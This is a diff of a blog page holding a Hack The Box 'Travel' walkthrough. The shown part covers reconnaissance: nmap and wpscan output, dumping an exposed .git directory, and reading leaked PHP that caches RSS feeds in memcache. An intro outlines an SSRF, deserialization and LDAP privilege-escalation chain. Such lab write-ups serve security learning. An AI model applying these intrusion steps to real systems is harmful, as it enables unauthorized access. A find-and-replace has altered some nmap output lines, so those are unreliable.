@@ -1,6 +1,6 @@
 <!DOCTYPE html>
 <html lang="en" dir="ltr" class="scroll-smooth" data-default-appearance="dark"
-  data-auto-appearance="true"><head><script src="/Secure-The-Throne/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=Secure-The-Throne/livereload" data-no-instant defer></script>
+  data-auto-appearance="true"><head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
   <meta charset="utf-8" />
   
   <meta http-equiv="content-language" content="en" />
@@ -8,17 +8,14 @@
   <meta name="viewport" content="width=device-width, initial-scale=1.0" />
   <meta http-equiv="X-UA-Compatible" content="ie=edge" />
   
-  <title>Travel Walkthrough(HTB) &middot; Secure The Throne</title>
-  <meta name="title" content="Travel Walkthrough(HTB) &middot; Secure The Throne" />
+  <title>Travel Walkthrough(Hack The Box) &middot; Secure The Throne</title>
+  <meta name="title" content="Travel Walkthrough(Hack The Box) &middot; Secure The Throne" />
   
   <meta name="description" content="A straight forward walkthrough of the box Travel from Hack The Box" />
-  <meta name="keywords" content="Hard, Linux, HTB, Hacking, Web, Walkthrough, " />
+  <meta name="keywords" content="Hard, Linux, Hack The Box, Hacking, Web, Walkthrough, " />
   
   
-  <link rel="canonical" href="http://localhost:1313/Secure-The-Throne/posts/1742495331851-travel-walkthroughhtb/" />
-  
-  
-  
+  <link rel="canonical" href="http://localhost:1313/posts/1742495331851-travel-walkthroughhtb/" />
   
   
   
@@ -28,12 +25,15 @@
   
   
   
-  <link type="text/css" rel="stylesheet" href="/Secure-The-Throne/css/main.bundle.min.41689a74295ccc3e512d39a90d741ccebbde3860c6ab3597149f60e95cdd18e4873f14a9f484bfad85452fece214f7257f3a74a9971df31c9efa5a199b6414b2.css"
+  
+  
+  
+  <link type="text/css" rel="stylesheet" href="/css/main.bundle.min.41689a74295ccc3e512d39a90d741ccebbde3860c6ab3597149f60e95cdd18e4873f14a9f484bfad85452fece214f7257f3a74a9971df31c9efa5a199b6414b2.css"
     integrity="sha512-QWiadClczD5RLTmpDXQczrveOGDGqzWXFJ9g6VzdGOSHPxSp9IS/rYVFL&#43;ziFPclfzp0qZcd8xye&#43;loZm2QUsg==" />
   
   
-  <script type="text/javascript" src="/Secure-The-Throne/js/appearance.min.314516f6fc60028f836d15d02678a0f42ee34554fb9c51c36fbb07e0c3b89d2ef4e827f2f1d81cb69a02248b89e2a1ca86afe6f212f7ce65329072265dbba39d.js"
-    integrity="sha512-MUUW9vxgAo&#43;DbRXQJnig9C7jRVT7nFHDb7sH4MO4nS706Cfy8dgctpoCJIuJ4qHKhq/m8hL3zmUykHImXbujnQ=="></script>
+  <script type="text/javascript" src="/js/appearance.min.abe07aa3ed764e6e722c4f1cd3f92acd0c1823260f550b6055a4811d0bc9b54753abb435aa4e92781e1df45555ec873d4d6231157af4ab2bf6e70de35355c062.js"
+    integrity="sha512-q&#43;B6o&#43;12Tm5yLE8c0/kqzQwYIyYPVQtgVaSBHQvJtUdTq7Q1qk6SeB4d9FVV7Ic9TWIxFXr0qyv25w3jU1XAYg=="></script>
   
   
   
@@ -48,48 +48,48 @@
   
   
   
-  <script defer type="text/javascript" id="script-bundle" src="/Secure-The-Throne/js/main.bundle.min.3ad74b33440334ca29f8801ec6dac1f314951cf580e503d49631816b48d1f28d03543275f92b651565b48045b90731f47595b1396214b8b6aa11c6990f867f7e.js"
+  <script defer type="text/javascript" id="script-bundle" src="/js/main.bundle.min.3ad74b33440334ca29f8801ec6dac1f314951cf580e503d49631816b48d1f28d03543275f92b651565b48045b90731f47595b1396214b8b6aa11c6990f867f7e.js"
     integrity="sha512-OtdLM0QDNMop&#43;IAextrB8xSVHPWA5QPUljGBa0jR8o0DVDJ1&#43;StlFWW0gEW5BzH0dZWxOWIUuLaqEcaZD4Z/fg==" data-copy="" data-copied=""></script>
   
   
   
-  <script src="/Secure-The-Throne/lib/zoom/zoom.min.37d2094687372da3f7343a221a470f6b8806f7891aa46a5a03966af7f0ebd38b9fe536cb154e6ad28f006d184b294525a7c4054b6bbb4be62d8b453b42db99bd.js" integrity="sha512-N9IJRoc3LaP3NDoiGkcPa4gG94kapGpaA5Zq9/Dr04uf5TbLFU5q0o8AbRhLKUUlp8QFS2u7S&#43;Yti0U7QtuZvQ=="></script>
+  <script src="/lib/zoom/zoom.min.37d2094687372da3f7343a221a470f6b8806f7891aa46a5a03966af7f0ebd38b9fe536cb154e6ad28f006d184b294525a7c4054b6bbb4be62d8b453b42db99bd.js" integrity="sha512-N9IJRoc3LaP3NDoiGkcPa4gG94kapGpaA5Zq9/Dr04uf5TbLFU5q0o8AbRhLKUUlp8QFS2u7S&#43;Yti0U7QtuZvQ=="></script>
   
   
   
-  <link rel="apple-touch-icon" sizes="180x180" href="/Secure-The-Throne/apple-touch-icon.png" />
-  <link rel="icon" type="image/png" sizes="32x32" href="/Secure-The-Throne/favicon-32x32.png" />
-  <link rel="icon" type="image/png" sizes="16x16" href="/Secure-The-Throne/favicon-16x16.png" />
-  <link rel="manifest" href="/Secure-The-Throne/site.webmanifest" />
-  
-  
-  
-  
+  <link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png" />
+  <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png" />
+  <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png" />
+  <link rel="manifest" href="/site.webmanifest" />
   
   
   
   
-  <meta property="og:url" content="http://localhost:1313/Secure-The-Throne/posts/1742495331851-travel-walkthroughhtb/">
+  
+  
+  
+  
+  <meta property="og:url" content="http://localhost:1313/posts/1742495331851-travel-walkthroughhtb/">
   <meta property="og:site_name" content="Secure The Throne">
-  <meta property="og:title" content="Travel Walkthrough(HTB)">
+  <meta property="og:title" content="Travel Walkthrough(Hack The Box)">
   <meta property="og:description" content="A straight forward walkthrough of the box Travel from Hack The Box">
   <meta property="og:locale" content="en">
   <meta property="og:type" content="article">
     <meta property="article:section" content="posts">
-    <meta property="article:published_time" content="2025-03-20T00:00:00+00:00">
-    <meta property="article:modified_time" content="2025-03-20T00:00:00+00:00">
+    <meta property="article:published_time" content="2025-03-23T00:00:00+00:00">
+    <meta property="article:modified_time" content="2025-03-23T00:00:00+00:00">
     <meta property="article:tag" content="Hard">
     <meta property="article:tag" content="Linux">
-    <meta property="article:tag" content="HTB">
+    <meta property="article:tag" content="Hack the Box">
     <meta property="article:tag" content="Hacking">
     <meta property="article:tag" content="Web">
     <meta property="article:tag" content="Walkthrough">
-    <meta property="og:image" content="http://localhost:1313/Secure-The-Throne/posts/1742495331851-travel-walkthroughhtb/featured.jpeg">
+    <meta property="og:image" content="http://localhost:1313/posts/1742495331851-travel-walkthroughhtb/featured.jpeg">
 
   
   <meta name="twitter:card" content="summary_large_image">
-  <meta name="twitter:image" content="http://localhost:1313/Secure-The-Throne/posts/1742495331851-travel-walkthroughhtb/featured.jpeg">
-  <meta name="twitter:title" content="Travel Walkthrough(HTB)">
+  <meta name="twitter:image" content="http://localhost:1313/posts/1742495331851-travel-walkthroughhtb/featured.jpeg">
+  <meta name="twitter:title" content="Travel Walkthrough(Hack The Box)">
   <meta name="twitter:description" content="A straight forward walkthrough of the box Travel from Hack The Box">
 
   
@@ -98,26 +98,26 @@
     "@context": "https://schema.org",
     "@type": "Article",
     "articleSection": "Posts",
-    "name": "Travel Walkthrough(HTB)",
-    "headline": "Travel Walkthrough(HTB)",
+    "name": "Travel Walkthrough(Hack The Box)",
+    "headline": "Travel Walkthrough(Hack The Box)",
     "description": "A straight forward walkthrough of the box Travel from Hack The Box",
     
     "inLanguage": "en",
-    "url" : "http:\/\/localhost:1313\/Secure-The-Throne\/posts\/1742495331851-travel-walkthroughhtb\/",
+    "url" : "http:\/\/localhost:1313\/posts\/1742495331851-travel-walkthroughhtb\/",
     "author" : {
       "@type": "Person",
       "name": "Emp5r0R"
     },
     "copyrightYear": "2025",
-    "dateCreated": "2025-03-20T00:00:00\u002b00:00",
-    "datePublished": "2025-03-20T00:00:00\u002b00:00",
+    "dateCreated": "2025-03-23T00:00:00\u002b00:00",
+    "datePublished": "2025-03-23T00:00:00\u002b00:00",
     
-    "dateModified": "2025-03-20T00:00:00\u002b00:00",
+    "dateModified": "2025-03-23T00:00:00\u002b00:00",
     
-    "keywords": ["Hard","Linux","HTB","Hacking","Web","Walkthrough"],
+    "keywords": ["Hard","Linux","Hack The Box","Hacking","Web","Walkthrough"],
     
     "mainEntityOfPage": "true",
-    "wordCount": "3040"
+    "wordCount": "3417"
   }]
   </script>
 
@@ -143,7 +143,7 @@
   
   
 
-<script src="/Secure-The-Throne/lib/jquery/jquery.slim.min.b0dca576e87d7eaa5850ae4e61759c065786cdb6489d68fcc82240539eebd5da522bdb4fda085ffd245808c8fe2acb2516408eb774ef26b5f6015fc6737c0ea8.js" integrity="sha512-sNylduh9fqpYUK5OYXWcBleGzbZInWj8yCJAU57r1dpSK9tP2ghf/SRYCMj&#43;KsslFkCOt3TvJrX2AV/Gc3wOqA=="></script>
+<script src="/lib/jquery/jquery.slim.min.b0dca576e87d7eaa5850ae4e61759c065786cdb6489d68fcc82240539eebd5da522bdb4fda085ffd245808c8fe2acb2516408eb774ef26b5f6015fc6737c0ea8.js" integrity="sha512-sNylduh9fqpYUK5OYXWcBleGzbZInWj8yCJAU57r1dpSK9tP2ghf/SRYCMj&#43;KsslFkCOt3TvJrX2AV/Gc3wOqA=="></script>
 
 
 
@@ -155,6 +155,9 @@
 
 
 
+
+
+<script defer src="/lib/typeit/typeit.umd.57f9bc6e047efc875cb4f2e9ca74c802de33638d2c3aff6d9b7eb3c7588c24649b6c3e51cd45f49c0ed0cf72aedbd694bf2d35f358a34076d63f9febabc0bd6f.js" integrity="sha512-V/m8bgR&#43;/IdctPLpynTIAt4zY40sOv9tm36zx1iMJGSbbD5RzUX0nA7Qz3Ku29aUvy0181ijQHbWP5/rq8C9bw=="></script>
 
 
 
@@ -196,11 +199,11 @@
     
     
     <div>
-        <a href="/Secure-The-Throne/" class="flex">
+        <a href="/" class="flex">
             <span class="sr-only">Secure The Throne</span>
 
             
-            <img src="/Secure-The-Throne/My_logo-background-less.png" width="512" height="512"
+            <img src="/My_logo-background-less.png" width="512" height="512"
                 class="logo max-h-[5rem] max-w-[5rem] object-scale-down object-left nozoom" alt="Secure The Throne" />
             
 
@@ -211,7 +214,7 @@
         <nav class="flex space-x-3">
 
             
-            <a href="/Secure-The-Throne/" class="text-base font-medium text-gray-500 hover:text-gray-900">Secure The Throne</a>
+            <a href="/" class="text-base font-medium text-gray-500 hover:text-gray-900">Secure The Throne</a>
             
 
         </nav>
@@ -220,7 +223,7 @@
             
             
             
-  <a href="/Secure-The-Throne/posts/"  class="flex items-center text-gray-500 hover:text-primary-600 dark:hover:text-primary-400">
+  <a href="/posts/"  class="flex items-center text-gray-500 hover:text-primary-600 dark:hover:text-primary-400">
     
     <p class="text-base font-medium" title="Posts">
         Posts
@@ -231,7 +234,7 @@
 
             
             
-  <a href="/Secure-The-Throne/tags/"  class="flex items-center text-gray-500 hover:text-primary-600 dark:hover:text-primary-400">
+  <a href="/tags/"  class="flex items-center text-gray-500 hover:text-primary-600 dark:hover:text-primary-400">
     
     <p class="text-base font-medium" title="Tags">
         Tags
@@ -242,7 +245,7 @@
 
             
             
-  <a href="/Secure-The-Throne/about/"  class="flex items-center text-gray-500 hover:text-primary-600 dark:hover:text-primary-400">
+  <a href="/about/"  class="flex items-center text-gray-500 hover:text-primary-600 dark:hover:text-primary-400">
     
     <p class="text-base font-medium" title="$WHOAMI">
         About
@@ -446,7 +449,7 @@
 
                     
   <li class="mt-1">
-    <a href="/Secure-The-Throne/posts/"  class="flex items-center text-gray-500 hover:text-primary-600 dark:hover:text-primary-400">
+    <a href="/posts/"  class="flex items-center text-gray-500 hover:text-primary-600 dark:hover:text-primary-400">
         
         <p class="text-bg font-bg" title="Posts">
             Posts
@@ -461,7 +464,7 @@
 
                     
   <li class="mt-1">
-    <a href="/Secure-The-Throne/tags/"  class="flex items-center text-gray-500 hover:text-primary-600 dark:hover:text-primary-400">
+    <a href="/tags/"  class="flex items-center text-gray-500 hover:text-primary-600 dark:hover:text-primary-400">
         
         <p class="text-bg font-bg" title="Tags">
             Tags
@@ -476,7 +479,7 @@
 
                     
   <li class="mt-1">
-    <a href="/Secure-The-Throne/about/"  class="flex items-center text-gray-500 hover:text-primary-600 dark:hover:text-primary-400">
+    <a href="/about/"  class="flex items-center text-gray-500 hover:text-primary-600 dark:hover:text-primary-400">
         
         <p class="text-bg font-bg" title="$WHOAMI">
             About
@@ -605,7 +608,7 @@
 
     
     <div class="fixed inset-x-0 top-0 h-[800px] single_hero_background nozoom"
-    style="background-image:url(/Secure-The-Throne/posts/1742495331851-travel-walkthroughhtb/featured_hu_940a411736ffc04.jpeg);">
+    style="background-image:url(/posts/1742495331851-travel-walkthroughhtb/featured_hu_940a411736ffc04.jpeg);">
     
 
 
@@ -631,7 +634,7 @@
   <header id="single_header" class="mt-5 max-w-prose">
     
     <h1 class="mt-0 text-4xl font-extrabold text-neutral-900 dark:text-neutral">
-      Travel Walkthrough(HTB)
+      Travel Walkthrough(Hack The Box)
     </h1>
     <div class="mt-1 mb-6 text-base text-neutral-500 dark:text-neutral-400 print:hidden">
       
@@ -678,10 +681,10 @@
 <div class="flex flex-row flex-wrap items-center">
   
   
-  <time datetime="2025-03-20T00:00:00&#43;00:00">20 March 2025</time><span class="px-2 text-primary-500">&middot;</span><span>3040 words</span><span class="px-2 text-primary-500">&middot;</span><span title="Reading time">15 mins</span><span class="px-2 text-primary-500">&middot;</span>
+  <time datetime="2025-03-23T00:00:00&#43;00:00">23 March 2025</time><span class="px-2 text-primary-500">&middot;</span><span>3417 words</span><span class="px-2 text-primary-500">&middot;</span><span title="Reading time">17 mins</span><span class="px-2 text-primary-500">&middot;</span>
 
 
-<script type="text/javascript" src="/Secure-The-Throne/js/zen-mode.min.eea5245cf9244ecbdf2c150d1c8833226c1541cadf6e98f63a7c9192b1a3676df2c3ec603b14f4cfaaa53971fd9d8955640c0f405bf3de2b43ee7a5fb29ae721.js" integrity="sha512-7qUkXPkkTsvfLBUNHIgzImwVQcrfbpj2OnyRkrGjZ23yw&#43;xgOxT0z6qlOXH9nYlVZAwPQFvz3itD7npfsprnIQ=="></script>
+<script type="text/javascript" src="/js/zen-mode.min.eea5245cf9244ecbdf2c150d1c8833226c1541cadf6e98f63a7c9192b1a3676df2c3ec603b14f4cfaaa53971fd9d8955640c0f405bf3de2b43ee7a5fb29ae721.js" integrity="sha512-7qUkXPkkTsvfLBUNHIgzImwVQcrfbpj2OnyRkrGjZ23yw&#43;xgOxT0z6qlOXH9nYlVZAwPQFvz3itD7npfsprnIQ=="></script>
 
 <span class="mb-[2px]">
     <span id="zen-mode-button"
@@ -737,7 +740,7 @@
   
   
   
-  <span style="margin-top:0.5rem" class="mr-2" onclick="window.open(&#34;/Secure-The-Throne/tags/hard/&#34;,'_self');return false;">
+  <span style="margin-top:0.5rem" class="mr-2" onclick="window.open(&#34;/tags/hard/&#34;,'_self');return false;">
     <span class="flex" style="cursor: pointer;">
   <span class="rounded-md border border-primary-400 px-1 py-[1px] text-xs font-normal text-primary-700 dark:border-primary-600 dark:text-primary-400">
     Hard
@@ -745,7 +748,7 @@
 </span>
   </span>
   
-  <span style="margin-top:0.5rem" class="mr-2" onclick="window.open(&#34;/Secure-The-Throne/tags/linux/&#34;,'_self');return false;">
+  <span style="margin-top:0.5rem" class="mr-2" onclick="window.open(&#34;/tags/linux/&#34;,'_self');return false;">
     <span class="flex" style="cursor: pointer;">
   <span class="rounded-md border border-primary-400 px-1 py-[1px] text-xs font-normal text-primary-700 dark:border-primary-600 dark:text-primary-400">
     Linux
@@ -753,15 +756,15 @@
 </span>
   </span>
   
-  <span style="margin-top:0.5rem" class="mr-2" onclick="window.open(&#34;/Secure-The-Throne/tags/htb/&#34;,'_self');return false;">
+  <span style="margin-top:0.5rem" class="mr-2" onclick="window.open(&#34;/tags/hack-the-box/&#34;,'_self');return false;">
     <span class="flex" style="cursor: pointer;">
   <span class="rounded-md border border-primary-400 px-1 py-[1px] text-xs font-normal text-primary-700 dark:border-primary-600 dark:text-primary-400">
-    HTB
+    Hack the Box
   </span>
 </span>
   </span>
   
-  <span style="margin-top:0.5rem" class="mr-2" onclick="window.open(&#34;/Secure-The-Throne/tags/hacking/&#34;,'_self');return false;">
+  <span style="margin-top:0.5rem" class="mr-2" onclick="window.open(&#34;/tags/hacking/&#34;,'_self');return false;">
     <span class="flex" style="cursor: pointer;">
   <span class="rounded-md border border-primary-400 px-1 py-[1px] text-xs font-normal text-primary-700 dark:border-primary-600 dark:text-primary-400">
     Hacking
@@ -769,7 +772,7 @@
 </span>
   </span>
   
-  <span style="margin-top:0.5rem" class="mr-2" onclick="window.open(&#34;/Secure-The-Throne/tags/web/&#34;,'_self');return false;">
+  <span style="margin-top:0.5rem" class="mr-2" onclick="window.open(&#34;/tags/web/&#34;,'_self');return false;">
     <span class="flex" style="cursor: pointer;">
   <span class="rounded-md border border-primary-400 px-1 py-[1px] text-xs font-normal text-primary-700 dark:border-primary-600 dark:text-primary-400">
     Web
@@ -777,7 +780,7 @@
 </span>
   </span>
   
-  <span style="margin-top:0.5rem" class="mr-2" onclick="window.open(&#34;/Secure-The-Throne/tags/walkthrough/&#34;,'_self');return false;">
+  <span style="margin-top:0.5rem" class="mr-2" onclick="window.open(&#34;/tags/walkthrough/&#34;,'_self');return false;">
     <span class="flex" style="cursor: pointer;">
   <span class="rounded-md border border-primary-400 px-1 py-[1px] text-xs font-normal text-primary-700 dark:border-primary-600 dark:text-primary-400">
     Walkthrough
@@ -819,7 +822,7 @@
         
       
       <img class="!mt-0 !mb-0 h-24 w-24 rounded-full ltr:mr-4 rtl:ml-4" width="96" height="96"
-      alt="Emp5r0R" src="/Secure-The-Throne/My-Picture_hu_52e4dc4fdec70a08.jpeg" />
+      alt="Emp5r0R" src="/My-Picture_hu_52e4dc4fdec70a08.jpeg" />
     
   
   <div class="place-self-center">
@@ -832,7 +835,7 @@
     </div>
     
     
-    <div class="text-sm text-neutral-700 dark:text-neutral-400">Born to learn</div>
+    <div class="text-sm text-neutral-700 dark:text-neutral-400">Lead By Curiosity</div>
     
     <div class="text-2xl sm:text-lg">
   <div class="flex flex-wrap text-neutral-400 dark:text-neutral-500">
@@ -945,10 +948,22 @@
     class="min-w-[220px] py-2 border-dotted ltr:-ml-5 ltr:border-l ltr:pl-5 rtl:-mr-5 rtl:border-r rtl:pr-5 dark:border-neutral-600">
     <nav id="TableOfContents">
   <ul>
-    <li><a href="#reconnaissance--enumeration-linux">Reconnaissance &amp; Enumeration #Linux</a></li>
-    <li><a href="#exploitation">Exploitation</a></li>
+    <li><a href="#about">About</a></li>
+    <li><a href="#reconnaissance--enumeration">Reconnaissance &amp; Enumeration</a>
+      <ul>
+        <li><a href="#understanding-awesome-rss">Understanding Awesome RSS</a></li>
+        <li><a href="#testing-with-gopher">Testing with Gopher</a></li>
+        <li><a href="#understanding-memcache">Understanding Memcache</a></li>
+      </ul>
+    </li>
+    <li><a href="#exploitation">Exploitation</a>
+      <ul>
+        <li><a href="#crafting-the-payload">Crafting the payload</a></li>
+      </ul>
+    </li>
     <li><a href="#pivoting">Pivoting</a></li>
     <li><a href="#privilege-escalation">Privilege Escalation</a></li>
+    <li><a href="#summary">Summary</a></li>
   </ul>
 </nav>
   </div>
@@ -962,10 +977,22 @@
     class="py-2 border-dotted border-neutral-300 ltr:-ml-5 ltr:border-l ltr:pl-5 rtl:-mr-5 rtl:border-r rtl:pr-5 dark:border-neutral-600">
     <nav id="TableOfContents">
   <ul>
-    <li><a href="#reconnaissance--enumeration-linux">Reconnaissance &amp; Enumeration #Linux</a></li>
-    <li><a href="#exploitation">Exploitation</a></li>
+    <li><a href="#about">About</a></li>
+    <li><a href="#reconnaissance--enumeration">Reconnaissance &amp; Enumeration</a>
+      <ul>
+        <li><a href="#understanding-awesome-rss">Understanding Awesome RSS</a></li>
+        <li><a href="#testing-with-gopher">Testing with Gopher</a></li>
+        <li><a href="#understanding-memcache">Understanding Memcache</a></li>
+      </ul>
+    </li>
+    <li><a href="#exploitation">Exploitation</a>
+      <ul>
+        <li><a href="#crafting-the-payload">Crafting the payload</a></li>
+      </ul>
+    </li>
     <li><a href="#pivoting">Pivoting</a></li>
     <li><a href="#privilege-escalation">Privilege Escalation</a></li>
+    <li><a href="#summary">Summary</a></li>
   </ul>
 </nav>
   </div>
@@ -1049,13 +1076,26 @@
         <div class="article-content max-w-prose mb-20">
           
 
-<h2 class="relative group">Reconnaissance &amp; Enumeration #Linux 
-    <div id="reconnaissance--enumeration-linux" class="anchor"></div>
+<h2 class="relative group">About 
+    <div id="about" class="anchor"></div>
     
     <span
         class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
         <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
-            style="text-decoration-line: none !important;" href="#reconnaissance--enumeration-linux" aria-label="Anchor">#</a>
+            style="text-decoration-line: none !important;" href="#about" aria-label="Anchor">#</a>
+    </span>        
+    
+</h2>
+<p>Travel is a hard difficulty Linux machine that features a WordPress instance along with a development server. The server is found to host an exposed Git repository, which reveals sensitive source code. The source code is analyzed and an SSRF and unsafe deserialization vulnerability are identified. These are leveraged to gain code execution. A backup password is cracked and used to move laterally. The user is found to be an LDAP administrator and can edit user attributes. This is leveraged to modify group membership and gain root privileges.</p>
+
+
+<h2 class="relative group">Reconnaissance &amp; Enumeration 
+    <div id="reconnaissance--enumeration" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
+            style="text-decoration-line: none !important;" href="#reconnaissance--enumeration" aria-label="Anchor">#</a>
     </span>        
     
 </h2>
@@ -1070,18 +1110,18 @@
 |_  256 3a:01:bc:f8:57:f5:27:a1:68:1d:6a:3d:4e:bc:21:1b (ED25519)
 80/tcp  open  http     nginx 1.17.6
 |_http-server-header: nginx/1.17.6
-|_http-title: Travel.HTB
+|_http-title: Travel.Hack The Box
 | http-methods: 
 |_  Supported Methods: GET HEAD
 443/tcp open  ssl/http nginx 1.17.6
 |_ssl-date: TLS randomness does not represent time
 | http-methods: 
 |_  Supported Methods: GET HEAD
-|_http-title: Travel.HTB - SSL coming soon.
+|_http-title: Travel.Hack The Box - SSL coming soon.
 |_http-server-header: nginx/1.17.6
-| ssl-cert: Subject: commonName=www.travel.htb/organizationName=Travel.HTB/countryName=UK
+| ssl-cert: Subject: commonName=www.travel.htb/organizationName=Travel.Hack The Box/countryName=UK
 | Subject Alternative Name: DNS:www.travel.htb, DNS:blog.travel.htb, DNS:blog-dev.travel.htb
-| Issuer: commonName=www.travel.htb/organizationName=Travel.HTB/countryName=UK
+| Issuer: commonName=www.travel.htb/organizationName=Travel.Hack The Box/countryName=UK
 | Public Key type: rsa
 | Public Key bits: 2048
 | Signature Algorithm: sha256WithRSAEncryption
@@ -1113,20 +1153,45 @@ HOP RTT       ADDRESS
 2   289.29 ms 10.10.10.189
 </code></pre><ul>
 <li>Surprisingly there are three ports open with 433 being the unusal .</li>
-<li>I can see the domain names from the nmap scan.</li>
-<li>There were some interesting information that I stumbled upon while on the reconnaissance process
-<ul>
-<li>I learnt about <code>hello@travel.htb</code> from the home page of port 80</li>
-<li>There were some pretty good filter on the <code>email</code> subscribe field</li>
-<li>![[Pasted image 20250227175233.png]]</li>
-<li>I found this j-query page, So I thought there could be api endpoints but there wasn&rsquo;t</li>
-<li>![[Pasted image 20250227175402.png]]</li>
-</ul>
+<li>Nmap scan reveals the domain names/Host names.</li>
+<li>There are some interesting information that I stumbled upon while on the reconnaissance process
+<blockquote>
+<p>I learnt about <code>hello@travel.htb</code> from the home page of port 80
+There is some pretty good filter on the <code>email</code> subscribe field
+
+  <figure>
+    <img class="my-0 rounded-md" loading="lazy" src="https://github.com/Emp5r0R/Db_of-pics/blob/main/Pasted%20image%2020250227175233.png?raw=true" alt="Pasted image 20250227175233.png" />
+    
+  </figure>
+
+I found this j-query page, So I thought there could be api endpoints but there wasn&rsquo;t any
+
+  <figure>
+    <img class="my-0 rounded-md" loading="lazy" src="https://github.com/Emp5r0R/Db_of-pics/blob/main/Pasted%20image%2020250227175402.png?raw=true" alt="Pasted image 20250227175402.png" />
+    
+  </figure>
+</p></blockquote>
 </li>
-<li>On port 443 got this</li>
-<li>![[Pasted image 20250227175537.png]]</li>
-<li><code>blog.travel.htb</code> had a pretty good page and it made of wordpress.</li>
-<li>![[Pasted image 20250227180045.png]]</li>
+<li>From port 443 I got these juicy information
+
+  <figure>
+    <img class="my-0 rounded-md" loading="lazy" src="https://github.com/Emp5r0R/Db_of-pics/blob/main/Pasted%20image%2020250227175537.png?raw=true" alt="Pasted image 20250227175537.png" />
+    
+  </figure>
+</li>
+<li><code>blog.travel.htb</code> had a pretty good page and it&rsquo;s made of wordpress.
+
+  <figure>
+    <img class="my-0 rounded-md" loading="lazy" src="https://media1.tenor.com/m/bKIiOYYbu-kAAAAd/reaction.gif" alt="info" />
+    
+  </figure>
+
+
+  <figure>
+    <img class="my-0 rounded-md" loading="lazy" src="https://github.com/Emp5r0R/Db_of-pics/blob/main/Pasted%20image%2020250227180045.png?raw=true" alt="Pasted image 20250227180045.png" />
+    
+  </figure>
+</li>
 <li>I ran <code>wpscan</code> against this website and found some interesting stuffs</li>
 </ul>
 <pre tabindex="0"><code>Interesting Finding(s):
@@ -1190,10 +1255,10 @@ HOP RTT       ADDRESS
  | Found By: Style (Passive Detection)
  |  - http://blog.travel.htb/wp-content/themes/twentytwenty/style.css?ver=1.2, Match: &#39;Version: 1.2&#39;
 </code></pre><ul>
-<li>But there were nothing useful</li>
-<li>When I try to access <code>blog-dev.travel.htb</code> I get <code>403</code> but If I fuzz the URL I can see exposed <code>.git</code></li>
-<li>From the <code>git</code> dump I can see three files <code>README.md</code>,<code>rss_template.php</code>,<code>template.php</code> respectively</li>
-<li>The file <code>README.md</code> exposed some information by exposing this content</li>
+<li>But there was nothing useful</li>
+<li>When I try to access <code>blog-dev.travel.htb</code> I get <code>403</code> but If I fuzz for directories I can see a exposed <code>.git</code> directory.</li>
+<li>Quickly I used <code>git-dumper</code> tool and from the dump I can see three files <code>README.md</code>,<code>rss_template.php</code>,<code>template.php</code> respectively</li>
+<li>The file <code>README.md</code> exposed some information</li>
 </ul>
 <pre tabindex="0"><code># Rss Template Extension
 
@@ -1331,10 +1396,30 @@ Allows rss-feeds to be shown on a custom wordpress page.
 </span></span></span><span class="line"><span class="cl"><span class="err">
 </span></span></span><span class="line"><span class="cl"><span class="err">&lt;?php
 </span></span></span><span class="line"><span class="cl"><span class="err">get_footer();
-</span></span></span></code></pre></div><ul>
+</span></span></span></code></pre></div>
+
+<h3 class="relative group">Understanding Awesome RSS 
+    <div id="understanding-awesome-rss" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
+            style="text-decoration-line: none !important;" href="#understanding-awesome-rss" aria-label="Anchor">#</a>
+    </span>        
+    
+</h3>
+<ul>
 <li><code>rss_template.php</code> is the source code for <code>Awesome RSS</code> which is from the web page <code>blog.travel.htb</code></li>
-<li>This following code uses <code>memcache</code> for caching and the format is with <code>xct_</code> as prefix to the cached data.</li>
+<li>This following code uses <code>memcache</code> for caching and with <code>xct_</code> as prefix to the cached data.</li>
 </ul>
+<p><span class="flex" style="cursor: pointer;">
+  <span class="rounded-md border border-primary-400 px-1 py-[1px] text-xs font-normal text-primary-700 dark:border-primary-600 dark:text-primary-400">
+     Definition 
+  </span>
+</span>
+
+Memcache module provides handy procedural and object-oriented interface to memcached, highly effective caching daemon, which was especially designed to decrease database load in dynamic web applications. The Memcache module also provides a session handler (memcache).
+More information about memcached can be found at » <a href="http://www.memcached.org/" target="_blank">http://www.memcached.org/</a>.</p>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl">     <span class="k">if</span> <span class="p">(</span><span class="nv">$url</span><span class="p">)</span> <span class="p">{</span>
 </span></span><span class="line"><span class="cl">         <span class="nv">$simplepie</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">SimplePie</span><span class="p">();</span>
 </span></span><span class="line"><span class="cl">         <span class="nv">$simplepie</span><span class="o">-&gt;</span><span class="na">set_cache_location</span><span class="p">(</span><span class="s1">&#39;memcache://127.0.0.1:11211/?timeout=60&amp;prefix=xct_&#39;</span><span class="p">);</span>
@@ -1350,8 +1435,13 @@ Allows rss-feeds to be shown on a custom wordpress page.
 </span></span><span class="line"><span class="cl"> 	 <span class="p">}</span>
 </span></span><span class="line"><span class="cl"> 	 <span class="nv">$feed</span> <span class="o">=</span> <span class="nx">get_feed</span><span class="p">(</span><span class="nv">$url</span><span class="p">);</span> 
 </span></span></code></pre></div><ul>
-<li><code>customefeed.xml</code> has the data in <code>xml</code> format, and the contents mach <code>Awesome RSS</code></li>
-<li>![[Pasted image 20250227222045.png]]</li>
+<li><code>customefeed.xml</code> has the data in <code>xml</code> format, and the contents match <code>Awesome RSS</code>
+
+  <figure>
+    <img class="my-0 rounded-md" loading="lazy" src="https://github.com/Emp5r0R/Db_of-pics/blob/main/Pasted%20image%2020250227222045.png?raw=true" alt="Pasted image 20250227222045.png" />
+    
+  </figure>
+</li>
 <li>Again this code function requests query string <code>custom_feed_url</code> for <code>customfeed.xml</code></li>
 </ul>
